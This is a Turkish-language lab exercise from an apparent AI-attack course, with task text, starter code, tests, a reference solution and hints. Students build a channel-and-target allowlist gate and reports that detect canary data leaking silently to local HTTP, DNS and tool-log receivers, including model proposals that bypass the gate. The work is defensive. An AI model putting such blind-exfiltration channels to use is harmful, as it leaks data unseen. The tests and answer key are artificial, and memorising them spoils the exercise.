Bu görev üç gerçek yerel alıcı kullanır. HTTP POST alıcısı veriyi gerçekten kaydedip HTTP cevabı vermeden bağlantıyı kapatır. UDP alıcıya gerçek DNS A/IN sorgu paketi gönderilir, canary base32 etiketlerden çözülüp kaydedilir; DNS cevabı gönderilmez. Araç kanalı gerçek yerel JSONL kaydıdır. **DNS paketi yalnız deneyin kendi UDP loopback alıcısına gider; dış DNS resolver / `.test` hedefe ağ sorgusu yapılmaz.** Hedef isimleri yerel olay etiketidir.

Kanıtı okurken önce alıcı dosyasına (`alici_olaylari`) bak. HTTP alıcısı isteği kaydeder ve cevap vermeden bağlantıyı kapatır; istemci tarafında bu bir hata gibi görünür. UDP alıcısı gerçek bir DNS A/IN paketi alır. Paketteki etiketlerden base32 ile kodlanmış canary'yi çözer ve hiçbir DNS cevabı göndermez. Böylece "yanıt yok ama veri ulaştı" durumu üç kanalda da gerçekten oluşur. Öğrencinin kanal/hedef kararı gönderimden önce çalışır. Altı doğrudan sentetik kontrol her kanalda meşru gönderim ve hedef reddini gerçek alıcıda sınar. Yedinci kontrollü kapı-atlama, yanıtsız canary ölçümünün gerçek olayı yakaladığını gösterir; model saldırı başarısı diye sayılmaz. Üç native model kolu temiz/korumalı/kapısız önerileri karşılaştırır; modelin uyması şart değildir. Gerçek alıcı dosyasındaki olaylar, paketin/gövdenin hashleri, yanıt yokluğu ve politika bypass raporu ayrı kaydedilir. Yalnız kendi HTTP/UDP alıcıları kapanır.
:::

::: gorev Gerçek deney · Yanıtsız alıcıdaki canaryyi ölç ve yetkisiz kanalı durdur
Önceki `kanal_karari`, `kor_kanit_raporu`, `kor_politika_regresyonu` işlevlerini birleştir. Çalıştır ham model önerileri ve gerçekten alınmış olayları gösterir. Kontrol Et saf sözleşmeleri ve gerçek yerel protokol/disk etkisini ayrı sınar.

```meta
motor: ai-gercek
gereksinim: ollama
timeout: 300
```

```starter
import ai_lab

def kanal_karari(olay, politika):
    # KUSURLU BAŞLANGIÇ KODU: yalnız kanala bakıyor, hedefi hiç denetlemiyor; izinli kanaldan saldırgan hedefe gönderim gerçek alıcıya ulaşır!
    hedef = olay["hedef"].lower().rstrip(".")
    izinli = olay["kanal"] in politika["kanallar"]
    return {"izinli": izinli, "neden": "izinli" if izinli else "kanal-izinsiz", "hedef": hedef}

def kor_kanit_raporu(olaylar, canary):
    return {"olay": len(olaylar), "kanal_sayilari": {"dns": 0, "http": 0, "arac": 0}, "canary_izleri": [], "yanitsiz_kanit": []}

def kor_politika_regresyonu(kayitlar):
    return {"vaka": len(kayitlar), "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}

if ai_lab.CALISTIR:
    from sandbox import ai_gercek_ai_saldiri_23 as deney
    deney.goster(kanal_karari,kor_kanit_raporu,kor_politika_regresyonu)

```

```test
OLAY = {"kanal": "dns", "hedef": "Collector.TEST.", "veri": "CANARY-7"}
POLITIKA = {"kanallar": ["dns", "http"], "hedefler": ["collector.test"]}
def sozlesme(fn):
    try:
        if fn(OLAY, POLITIKA) != {"izinli": True, "neden": "izinli", "hedef": "collector.test"}:
            return False
        if fn(dict(OLAY, kanal="arac", hedef="internal.test"), POLITIKA) != {"izinli": False, "neden": "kanal-izinsiz", "hedef": "internal.test"}:
            return False
        if fn(dict(OLAY, hedef="internal.test"), POLITIKA) != {"izinli": False, "neden": "hedef-izinsiz", "hedef": "internal.test"}:
            return False
        if fn(dict(OLAY, veri=" " * 63 + "~"), POLITIKA)["izinli"] is not True:
            return False
        if fn(dict(OLAY, veri="x"), POLITIKA)["izinli"] is not True:
            return False
        for olay, politika in [
            (None, POLITIKA), (dict(OLAY, ek=1), POLITIKA), (dict(OLAY, kanal="smtp"), POLITIKA),
            (dict(OLAY, hedef=""), POLITIKA), (dict(OLAY, hedef="collector.example"), POLITIKA),
            (dict(OLAY, hedef="collector_test"), POLITIKA), (dict(OLAY, veri=""), POLITIKA),
            (dict(OLAY, veri="x" * 65), POLITIKA), (dict(OLAY, veri="a\x1fb"), POLITIKA),
            (dict(OLAY, veri="a\x7fb"), POLITIKA), (dict(OLAY, veri="ğ"), POLITIKA),
            (OLAY, None), (OLAY, dict(POLITIKA, ek=1)), (OLAY, {"kanallar": [], "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["dns", "dns"], "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["smtp"], "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": "dns", "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["dns"], "hedefler": []}),
            (OLAY, {"kanallar": ["dns"], "hedefler": ["Collector.test"]}),
            (dict(OLAY, hedef=3), POLITIKA), (dict(OLAY, hedef="a_b.test"), POLITIKA),
            (dict(OLAY, veri=[1]), POLITIKA),
            (OLAY, {"kanallar": ("dns",), "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["dns"], "hedefler": ("collector.test",)}),
            (OLAY, {"kanallar": ["dns"], "hedefler": ["collector.test", "collector.test"]}),
        ]:
            try:
                fn(olay, politika)
                return False
            except ValueError:
                pass
        return True
    except Exception:
        return False
ok(sozlesme(kanal_karari), "kanal önceliği, fixture hedefi, veri sınırı ve politika şeması korunmalı")
def m_kanal(olay, politika):
    genis = dict(politika, kanallar=list(politika["kanallar"]) + [olay["kanal"]])
    return kanal_karari(olay, genis)
def m_hedef(olay, politika):
    hedef = olay["hedef"].lower().rstrip(".")
    genis = dict(politika, hedefler=list(politika["hedefler"]) + [hedef])
    return kanal_karari(olay, genis)
def m_veri(olay, politika):
    return kanal_karari(dict(olay, veri=olay["veri"][:64]), politika)
for ad, mutant in [("her kanalı izinli yapan", m_kanal), ("her hedefi izinli yapan", m_hedef), ("uzun veriyi sessizce kesen", m_veri)]:
    ok(not sozlesme(mutant), "yanlış çözüm/mutant yakalanmalı: " + ad)

import copy
OLAYLAR = [
    {"id": "o1", "kanal": "dns", "hedef": "collector.test", "veri": "x-CANARY-7", "yanit": None},
    {"id": "o2", "kanal": "http", "hedef": "collector.test", "veri": "CANARY-7", "yanit": ""},
    {"id": "o3", "kanal": "arac", "hedef": "logs.test", "veri": "CANARY-7-y", "yanit": "ok"},
    {"id": "o4", "kanal": "dns", "hedef": "collector.test", "veri": "temiz", "yanit": None},
]
BEKLENEN = {"olay": 4, "kanal_sayilari": {"dns": 2, "http": 1, "arac": 1}, "canary_izleri": ["o1", "o2", "o3"], "yanitsiz_kanit": ["o1"]}
def sozlesme(fn):
    try:
        once = copy.deepcopy(OLAYLAR)
        if fn(OLAYLAR, "CANARY-7") != BEKLENEN or OLAYLAR != once or fn(list(reversed(OLAYLAR)), "CANARY-7") != BEKLENEN:
            return False
        if fn([], "C") != {"olay": 0, "kanal_sayilari": {"dns": 0, "http": 0, "arac": 0}, "canary_izleri": [], "yanitsiz_kanit": []}:
            return False
        if fn([], "!" * 31 + "~")["olay"] != 0:
            return False
        if fn([dict(OLAYLAR[0], veri=" " * 63 + "~", yanit=" ~")], "bulunmayan")["olay"] != 1:
            return False
        for olaylar, canary in [
            (None, "C"), (OLAYLAR, ""), (OLAYLAR, "x" * 33), (OLAYLAR, "a b"), (OLAYLAR, "a\x7fb"),
            (OLAYLAR + [OLAYLAR[0]], "C"), ([None], "C"), ([dict(OLAYLAR[0], ek=1)], "C"),
            ([dict(OLAYLAR[0], id="")], "C"), ([dict(OLAYLAR[0], kanal="smtp")], "C"),
            ([dict(OLAYLAR[0], hedef="Collector.test")], "C"),
            ([dict(OLAYLAR[0], veri="x" * 65)], "C"),
            ([dict(OLAYLAR[0], veri="a\x1fb")], "C"), ([dict(OLAYLAR[0], veri="a\x7fb")], "C"),
            ([dict(OLAYLAR[0], yanit=3)], "C"), ([dict(OLAYLAR[0], yanit="\n")], "C"),
            ([dict(OLAYLAR[0], yanit="a\x7fb")], "C"),
            (OLAYLAR, [1]), ([dict(OLAYLAR[0], id=3)], "C"),
            ([dict(OLAYLAR[0], hedef=3)], "C"), ([dict(OLAYLAR[0], hedef="collector.test.")], "C"),
            ([dict(OLAYLAR[0], hedef="a_b.test")], "C"), ([dict(OLAYLAR[0], hedef="collector.com")], "C"),
            ([dict(OLAYLAR[0], veri=[1])], "C"), ([dict(OLAYLAR[0], yanit="\x1f")], "C"),
        ]:
            try:
                fn(olaylar, canary)
                return False
            except ValueError:
                pass
        return True
    except Exception:
        return False
ok(sozlesme(kor_kanit_raporu), "kanal sayımı, canary substring'i ve yanıtsız kanıt korunmalı")
def m_kanal(olaylar, canary):
    return kor_kanit_raporu([x for x in olaylar if x["kanal"] == "http"], canary)
def m_yanit(olaylar, canary):
    sonuc = kor_kanit_raporu(olaylar, canary)
    sonuc["yanitsiz_kanit"] = []
    return sonuc
def m_bos(olaylar, canary):
    return kor_kanit_raporu([dict(x, yanit=None if x["yanit"] == "" else x["yanit"]) for x in olaylar], canary)
for ad, mutant in [("DNS ve araç kanıtını düşüren", m_kanal), ("yanıtsız kanıtı gizleyen", m_yanit), ("boş cevabı yanıt yok sayan", m_bos)]:
    ok(not sozlesme(mutant), "yanlış çözüm/mutant yakalanmalı: " + ad)

import copy
KAYITLAR = [
    {"vaka_id": "v1", "izinli": False, "olay_oldu": True, "canary_goruldu": True, "yanit_alindi": False},
    {"vaka_id": "v2", "izinli": False, "olay_oldu": True, "canary_goruldu": True, "yanit_alindi": True},
    {"vaka_id": "v3", "izinli": True, "olay_oldu": True, "canary_goruldu": True, "yanit_alindi": False},
    {"vaka_id": "v4", "izinli": False, "olay_oldu": False, "canary_goruldu": False, "yanit_alindi": False},
    {"vaka_id": "v5", "izinli": True, "olay_oldu": False, "canary_goruldu": False, "yanit_alindi": False},
    {"vaka_id": "v6", "izinli": False, "olay_oldu": True, "canary_goruldu": False, "yanit_alindi": False},
    {"vaka_id": "v7", "izinli": True, "olay_oldu": True, "canary_goruldu": False, "yanit_alindi": True},
]
BEKLENEN = {"vaka": 7, "politika_bypassi": ["v1", "v2", "v6"], "sessiz_sizinti": ["v1"], "yanitsiz_kanit": ["v1", "v3"], "beklenen_olay_yok": ["v5"], "temiz": ["v3", "v4", "v7"]}
def sozlesme(fn):
    try:
        once = copy.deepcopy(KAYITLAR)
        if fn(KAYITLAR) != BEKLENEN or KAYITLAR != once or fn(list(reversed(KAYITLAR))) != BEKLENEN:
            return False
        if fn([]) != {"vaka": 0, "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}:
            return False
        for kayitlar in [
            None, {}, [None], KAYITLAR + [KAYITLAR[0]], [dict(KAYITLAR[0], ek=1)],
            [dict(KAYITLAR[0], vaka_id="")], [dict(KAYITLAR[0], izinli=0)],
            [dict(KAYITLAR[0], olay_oldu=1)], [dict(KAYITLAR[0], canary_goruldu=0)],
            [dict(KAYITLAR[0], yanit_alindi=1)],
            [dict(KAYITLAR[3], canary_goruldu=True)], [dict(KAYITLAR[3], yanit_alindi=True)],
            [dict(KAYITLAR[0], vaka_id=3)],
        ]:
            try:
                fn(kayitlar)
                return False
            except ValueError:
                pass
        return True
    except Exception:
        return False
ok(sozlesme(kor_politika_regresyonu), "bypass, sessiz sızıntı, yanıtsız kanıt ve temizlik ayrımı korunmalı")
def m_sessiz(kayitlar):
    sonuc = kor_politika_regresyonu(kayitlar)
    sonuc["sessiz_sizinti"] = []
    return sonuc
def m_yanitsiz(kayitlar):
    sonuc = kor_politika_regresyonu(kayitlar)
    sonuc["yanitsiz_kanit"] = list(sonuc["sessiz_sizinti"])
    return sonuc
def m_temiz(kayitlar):
    sonuc = kor_politika_regresyonu(kayitlar)
    sonuc["temiz"] = sorted(x["vaka_id"] for x in kayitlar if not x["olay_oldu"])
    return sonuc
for ad, mutant in [("sessiz sızıntıyı gizleyen", m_sessiz), ("izinli yanıtsız kanıtı düşüren", m_yanitsiz), ("izinli olayları temiz saymayan", m_temiz)]:
    ok(not sozlesme(mutant), "yanlış çözüm/mutant yakalanmalı: " + ad)

from sandbox import ai_gercek_ai_saldiri_23 as deney
import tempfile
from pathlib import Path
import ast
_yasak=('karar_ref','kanit_ref','regresyon_ref','kanit_yaz')
_sorun=list(ai_lab.kod_denetimi(src,_yasak))
for _n in ast.walk(ast.parse(src)):
    if isinstance(_n,ast.ImportFrom) and any(a.name in _yasak or a.name=='*' for a in _n.names):_sorun.append('referans importu yasak')
    if isinstance(_n,(ast.Import,ast.ImportFrom)) and any(x and x.split('.')[0] in ('inspect','importlib','runpy') for x in [a.name for a in _n.names]+([_n.module] if isinstance(_n,ast.ImportFrom) else [])):_sorun.append('kaynak okuma/dinamik import yasak')
    if isinstance(_n,ast.Name) and _n.id in ('exec','eval','compile','__builtins__'):_sorun.append('dinamik kod çalıştırma yasak: '+_n.id)
if not ok(not _sorun, 'laboratuvar/gerçek ölçüm yamalanmamalı, referans kullanılmamalı: '+'; '.join(sorted(set(_sorun)))):stop()
with tempfile.TemporaryDirectory(prefix='pafta_blind23_') as tmp:
    p=Path(tmp)/'kanal.json';p.write_text(deney.ORNEK.read_text(encoding='utf-8'),encoding='utf-8')
    r=deney.deney(kanal_karari,kor_kanit_raporu,kor_politika_regresyonu,p,Path(tmp)/'deney')
    for k,v in r['kontroller'].items():ok(v,'gerçek deney: '+k)
    accepted=all(r['kontroller'].values());ai_lab.kanit_yaz('saldiri-23-kor-kanit',dict(r,kabul=accepted));ok(accepted,'gerçek yanıtsız HTTP/DNS/araç alıcısı ve politika kapısı; saldırı başarısı şart değil')

```

```solution
import ai_lab
def kanal_karari(olay, politika):
    import re
    bilinen = ("dns", "http", "arac")
    def normal_hedef(deger):
        if not isinstance(deger, str):
            raise ValueError("hedef string olmalı")
        hedef = deger.lower().rstrip(".")
        if not re.fullmatch(r"[a-z0-9.-]+", hedef) or not hedef.endswith(".test"):
            raise ValueError("hedef fixture adı olmalı")
        return hedef
    if not isinstance(olay, dict) or set(olay) != {"kanal", "hedef", "veri"}:
        raise ValueError("olay şeması geçersiz")
    if olay["kanal"] not in bilinen:
        raise ValueError("kanal geçersiz")
    hedef = normal_hedef(olay["hedef"])
    veri = olay["veri"]
    if not isinstance(veri, str) or not 1 <= len(veri) <= 64 or any(ord(c) < 32 or ord(c) > 126 for c in veri):
        raise ValueError("veri geçersiz")
    if not isinstance(politika, dict) or set(politika) != {"kanallar", "hedefler"}:
        raise ValueError("politika şeması geçersiz")
    if not isinstance(politika["kanallar"], list) or not politika["kanallar"] or any(x not in bilinen for x in politika["kanallar"]):
        raise ValueError("kanal politikası geçersiz")
    if len(politika["kanallar"]) != len(set(politika["kanallar"])):
        raise ValueError("kanallar benzersiz olmalı")
    if not isinstance(politika["hedefler"], list) or not politika["hedefler"]:
        raise ValueError("hedef politikası geçersiz")
    hedefler = [normal_hedef(x) for x in politika["hedefler"]]
    if any(x != x.lower().rstrip(".") for x in politika["hedefler"]) or len(hedefler) != len(set(hedefler)):
        raise ValueError("politika hedefleri kanonik ve benzersiz olmalı")
    if olay["kanal"] not in politika["kanallar"]:
        return {"izinli": False, "neden": "kanal-izinsiz", "hedef": hedef}
    if hedef not in hedefler:
        return {"izinli": False, "neden": "hedef-izinsiz", "hedef": hedef}
    return {"izinli": True, "neden": "izinli", "hedef": hedef}

def kor_kanit_raporu(olaylar, canary):
    import re
    if not isinstance(olaylar, list):
        raise ValueError("olaylar liste olmalı")
    if not isinstance(canary, str) or not 1 <= len(canary) <= 32 or any(ord(c) < 33 or ord(c) > 126 for c in canary):
        raise ValueError("canary geçersiz")
    sonuc = {"olay": 0, "kanal_sayilari": {"dns": 0, "http": 0, "arac": 0}, "canary_izleri": [], "yanitsiz_kanit": []}
    kimlikler = set()
    for olay in olaylar:
        if not isinstance(olay, dict) or set(olay) != {"id", "kanal", "hedef", "veri", "yanit"}:
            raise ValueError("olay şeması geçersiz")
        if not isinstance(olay["id"], str) or not olay["id"] or olay["id"] in kimlikler:
            raise ValueError("olay kimliği geçersiz")
        if olay["kanal"] not in sonuc["kanal_sayilari"]:
            raise ValueError("kanal geçersiz")
        if not isinstance(olay["hedef"], str):
            raise ValueError("hedef string olmalı")
        if olay["hedef"] != olay["hedef"].lower().rstrip("."):
            raise ValueError("hedef kanonik olmalı")
        if not re.fullmatch(r"[a-z0-9.-]+", olay["hedef"]):
            raise ValueError("hedef karakterleri geçersiz")
        if not olay["hedef"].endswith(".test"):
            raise ValueError("hedef fixture adı olmalı")
        if not isinstance(olay["veri"], str) or len(olay["veri"]) > 64 or any(ord(c) < 32 or ord(c) > 126 for c in olay["veri"]):
            raise ValueError("veri geçersiz")
        if olay["yanit"] is not None and (not isinstance(olay["yanit"], str) or any(ord(c) < 32 or ord(c) > 126 for c in olay["yanit"])):
            raise ValueError("yanıt geçersiz")
        kimlikler.add(olay["id"])
        sonuc["kanal_sayilari"][olay["kanal"]] += 1
        if canary in olay["veri"]:
            sonuc["canary_izleri"].append(olay["id"])
            if olay["yanit"] is None:
                sonuc["yanitsiz_kanit"].append(olay["id"])
    sonuc["olay"] = len(kimlikler)
    sonuc["canary_izleri"].sort()
    sonuc["yanitsiz_kanit"].sort()
    return sonuc

def kor_politika_regresyonu(kayitlar):
    if not isinstance(kayitlar, list):
        raise ValueError("kayıtlar liste olmalı")
    sonuc = {"vaka": 0, "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}
    vakalar = set()
    for kayit in kayitlar:
        if not isinstance(kayit, dict) or set(kayit) != {"vaka_id", "izinli", "olay_oldu", "canary_goruldu", "yanit_alindi"}:
            raise ValueError("kayıt şeması geçersiz")
        if not isinstance(kayit["vaka_id"], str) or not kayit["vaka_id"] or kayit["vaka_id"] in vakalar:
            raise ValueError("vaka kimliği geçersiz")
        if not all(isinstance(kayit[x], bool) for x in ("izinli", "olay_oldu", "canary_goruldu", "yanit_alindi")):
            raise ValueError("bool alanlar geçersiz")
        if (kayit["canary_goruldu"] or kayit["yanit_alindi"]) and not kayit["olay_oldu"]:
            raise ValueError("yan etki olay gerektirir")
        vakalar.add(kayit["vaka_id"])
        bypass = not kayit["izinli"] and kayit["olay_oldu"]
        kanit = kayit["olay_oldu"] and kayit["canary_goruldu"] and not kayit["yanit_alindi"]
        if bypass:
            sonuc["politika_bypassi"].append(kayit["vaka_id"])
        if bypass and kayit["canary_goruldu"] and not kayit["yanit_alindi"]:
            sonuc["sessiz_sizinti"].append(kayit["vaka_id"])
        if kanit:
            sonuc["yanitsiz_kanit"].append(kayit["vaka_id"])
        if kayit["izinli"] and not kayit["olay_oldu"]:
            sonuc["beklenen_olay_yok"].append(kayit["vaka_id"])
        if kayit["olay_oldu"] == kayit["izinli"] and (kayit["izinli"] or not kayit["canary_goruldu"]):
            sonuc["temiz"].append(kayit["vaka_id"])
    sonuc["vaka"] = len(vakalar)
    for alan in ("politika_bypassi", "sessiz_sizinti", "yanitsiz_kanit", "beklenen_olay_yok", "temiz"):
        sonuc[alan].sort()
    return sonuc
if ai_lab.CALISTIR:
    from sandbox import ai_gercek_ai_saldiri_23 as deney
    deney.goster(kanal_karari,kor_kanit_raporu,kor_politika_regresyonu)

```

```hint
Yanıt yokluğu olayın yokluğu değildir; kanıtı gerçek alıcıdan say. Kanal ve hedefi gönderimden önce denetle. İzinli yanıtsız olay ile yetkisiz sessiz sızıntıyı ayır; her şeyi reddeden çözüm normal kontrolleri geçemez.
```
:::


::: anlat Bunu iki dakikada nasıl anlatırsın?
Yanıt None olsa bile alıcının kaydettiği olay veri çıkışı gösterebilir. Önce izinli kanal ve hedef kararını, sonra gerçek olayın olup olmadığını, son olarak canary eşleşmesini ayır. Kör kanıtın birimi model cevabı değil alıcıdaki istek kaydıdır. Boş string alınmış bir cevapla hiç cevap olmamasını aynı sayma. Yerel HTTP/DNS benzeri alıcı ölçümü genel dış ağ erişimi veya gizli bilgi çıkarma iddiası değildir.

Önkoşul ve yol köprüsü: ai-saldiri-22 hedef politikası.

| Yaygın yanlış | Mekanizma ve sınır |
|---|---|
| Yanıt gelmediyse sızıntı yoktur | Alıcıdaki canary olayı cevap kanalından bağımsızdır |

Dinleyiciye sor: Hangi kaydın kaybolması bu deneyin sonucunu doğrulanamaz yapar? Ham veri, model önerisi ve gerçek yan etkiyi ayrı göstererek cevapla.
:::


::: anlat Birincil kaynak ve deney sınırı
[OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html): Hedef allowlist için referans. Kör sızıntı kanıtı bu derste ayrıca gerçek yerel alıcı kaydından ölçülür.
:::
